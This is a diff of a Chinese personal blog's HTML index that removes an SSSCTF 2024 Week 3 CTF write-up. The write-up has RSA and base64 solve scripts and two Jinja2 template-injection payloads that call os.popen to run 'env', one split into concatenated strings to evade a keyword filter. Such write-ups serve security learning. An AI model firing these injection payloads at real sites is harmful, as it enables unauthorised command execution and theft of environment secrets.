@@ -146,91 +146,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/22/SSSCTF%202024%E7%83%AD%E8%BA%AB%E8%B5%9B%E4%B8%AA%E4%BA%BA%E9%A2%98%E8%A7%A3[Week%203]/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="songhahaha">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="songhahaha的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/10/22/SSSCTF%202024%E7%83%AD%E8%BA%AB%E8%B5%9B%E4%B8%AA%E4%BA%BA%E9%A2%98%E8%A7%A3%5BWeek%203%5D/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-10-22 23:09:08" itemprop="dateCreated datePublished" datetime="2024-10-22T23:09:08+08:00">2024-10-22</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-10-11 19:52:55" itemprop="dateModified" datetime="2024-10-11T19:52:55+08:00">2024-10-11</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="SSSCTF-2024热身赛个人题解-Week-3"><a href="#SSSCTF-2024热身赛个人题解-Week-3" class="headerlink" title="SSSCTF 2024热身赛个人题解[Week 3]"></a>SSSCTF 2024热身赛个人题解[Week 3]</h1><p>用户名：songhahaha<br>姓名：宋明润</p>
-<h2 id="ComplexRSA"><a href="#ComplexRSA" class="headerlink" title="ComplexRSA"></a>ComplexRSA</h2><p>复数情况下的RSA，附上代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cc = [14013191300246951236545757817808873022352950050081824264869086369007367653268991787107486350791912767070085303836267867505394171494366247257473647565589082372710844725255284810172702709769887174436490552227284599750894383232361109097551433612344983274256057787902078345028486555245738102670589719135898731758104717923219952916665381975847978600511860252098202853668359384569751744144301572922689761360398414577030560391463208712774012968498557142757810251547106925568393146447658517920334319725890552897805590558397429478703839302178512581213933989476936569630008522569589621216569048833101636465727409601740700760548,</span><br><span class="line">      18583150704700190423038682764523716896899621953417713865949996574009165125737882333882217754880645666745058485693320601057311472614930487169797635625740547394029658986458890299474253378372494053454570349749016569211902087048179229198092167446343166130332193032397161523028067146732262960700690765512148215792401805977283890476181038719642070872795373831054364594778482179778258422661542887902612031796039905235706085718839277823706491524273789162652169019723137223617348947381507130766035315272685790271596987679943306857205009594192402539268698018287987441058637192135469142516887265390055432482214584443794165476943]</span><br><span class="line">p=126532867306634334942108753575274858375095201850571019222461226184670422964011220771032939480087077151400174421012537458001519324442182099574862683701645444257824918267002132984823586856243794818357070615918741537413230207827278605279022123019463819067438461071304750484987895064000870256095971137855543113579</span><br><span class="line">q=153975453515898111498641967203711108700000569265260893190761415726781186509861678539840298741887922976102316828633667941541829497931272385598729444139499781157096065648430476681610966055966009784942704831870890141676367392322568864791347942405028271165160178443732515572442091226672488841425362670043272668729</span><br><span class="line">e = 0x10001</span><br><span class="line">c1 = Complex(cc[0], cc[1])</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p ^ 2 - 1) * (q ^ 2 - 1)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">xor = lambda A, B, n: bytes([A[i] ^ B[i] for i in range(n)])</span><br><span class="line">mm = complex_pow(c1, d, n).get_value()</span><br><span class="line"></span><br><span class="line">mm1 = [43144045013452081494883173452029636360853461452603086236039463988,5985816333917759043721504361549479367753228558651208301271712073]</span><br><span class="line">enc = long_to_bytes(int(mm1[0]))</span><br><span class="line">key= long_to_bytes(int(mm1[1]))</span><br><span class="line">flag = xor(enc, key, len(enc))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
-
-<h2 id="二元一次方程组-Week3"><a href="#二元一次方程组-Week3" class="headerlink" title="二元一次方程组 [Week3]"></a>二元一次方程组 [Week3]</h2><p>看了提示才明白，要使用二项式展开，由于p*q&#x3D;n，所以二项式展开后取模，原始式可以化简到只剩开头和结尾。</p>
-<p>随后两个方程进行操作，得到p，q</p>
-<p>附上代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c1 = pow(c1 * pow(x21,e1 , n), e2, n)</span><br><span class="line">c2 = pow(c2 * pow(x11, e2, n), e1, n)</span><br><span class="line">q = gmpy2.gcd(c2 - c1, n)</span><br><span class="line">p = n // q</span><br><span class="line">d = inverse(e, (p-1)*(q-1))</span><br><span class="line">f = pow(c, d, n)</span><br><span class="line">print(long_to_bytes(f))</span><br></pre></td></tr></table></figure>
-
-<h2 id="EZ-WAV-Week-3"><a href="#EZ-WAV-Week-3" class="headerlink" title="EZ_WAV [Week 3]"></a>EZ_WAV [Week 3]</h2><p>注意到音频中有一段摩斯密码，听了好长时间才听出来</p>
-<h2 id="base64-pro-Week-3"><a href="#base64-pro-Week-3" class="headerlink" title="base64 pro [Week 3]"></a>base64 pro [Week 3]</h2><p>网上有关于base64的介绍知识，甚至可以搜到现成的解密代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">d为txt中的内容</span><br><span class="line">e=d.splitlines()</span><br><span class="line">binstr=&quot;&quot;</span><br><span class="line">base64=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line">for i in e :</span><br><span class="line">    if i.find(&quot;==&quot;)&gt;0:</span><br><span class="line">        temp=bin((base64.find(i[-3])&amp;15))[2:]</span><br><span class="line">        binstr=binstr + &quot;0&quot;*(4-len(temp))+temp</span><br><span class="line">    elif i.find(&quot;=&quot;)&gt;0:</span><br><span class="line">        temp=bin((base64.find(i[-2])&amp;3))[2:]</span><br><span class="line">        binstr=binstr + &quot;0&quot;*(2-len(temp))+temp</span><br><span class="line">str=&quot;&quot;</span><br><span class="line">for i in range(0,len(binstr),8):</span><br><span class="line">    str=str+chr(int(binstr[i:i+8],2))</span><br><span class="line">print(str)</span><br></pre></td></tr></table></figure>
-
-<h2 id="hidden-flag-Week-3"><a href="#hidden-flag-Week-3" class="headerlink" title="hidden_flag [Week 3]"></a>hidden_flag [Week 3]</h2><p>Linux基本使用，more &#x2F;root&#x2F;start.sh即可找到三个flag分别藏在哪。第一个是程序，第二个.flag2隐藏了，第三个环境变量</p>
-<h2 id="file-descriptor-Week-3"><a href="#file-descriptor-Week-3" class="headerlink" title="file_descriptor [Week 3]"></a>file_descriptor [Week 3]</h2><p>下载程序进行分析，反编译代码后观察发现7对应flag文 件，同时需要使用4将其输出。输入7 4即可</p>
-<h2 id="（君の名は）–"><a href="#（君の名は）–" class="headerlink" title="（君の名は）–"></a>（君の名は）–</h2><p>上网搜索之后发现需要模板注入(SSTI)。</p>
-<p>这一关没有屏蔽关键词，难度较低。</p>
-<p>寻找可能执行命令的类，然后利用漏洞。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print lipsum.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()%&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="君の名は"><a href="#君の名は" class="headerlink" title="君の名は"></a>君の名は</h2><p>跟上一题一样只是多了字符屏蔽。只需要字符串拼接就好。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print lipsum[&quot;__glob&quot;+&quot;als__&quot;][&quot;__bui&quot;+&quot;ltins__&quot;][&quot;__im&quot;+&quot;port__&quot;](&quot;o&quot;+&quot;s&quot;)[&quot;po&quot;+&quot;pen&quot;](&quot;env&quot;).read()%&#125;</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/22/%E7%AC%AC%E4%B8%80%E6%AC%A124.10.25/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -275,72 +190,6 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2024/10/22/%E7%AC%AC%E4%B8%80%E6%AC%A124.10.25/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/22/SSSCTF%202024%E7%83%AD%E8%BA%AB%E8%B5%9B%E4%B8%AA%E4%BA%BA%E9%A2%98%E8%A7%A3[Week%202]/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="songhahaha">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="songhahaha的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/10/22/SSSCTF%202024%E7%83%AD%E8%BA%AB%E8%B5%9B%E4%B8%AA%E4%BA%BA%E9%A2%98%E8%A7%A3%5BWeek%202%5D/" class="post-title-link" itemprop="url">SSSCTF 2024热身赛个人题解</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2024-10-22 09:39:37 / 修改时间：11:25:18" itemprop="dateCreated datePublished" datetime="2024-10-22T09:39:37+08:00">2024-10-22</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>用户名：songhahaha</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/10/22/SSSCTF%202024%E7%83%AD%E8%BA%AB%E8%B5%9B%E4%B8%AA%E4%BA%BA%E9%A2%98%E8%A7%A3%5BWeek%202%5D/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -426,7 +275,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">1</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
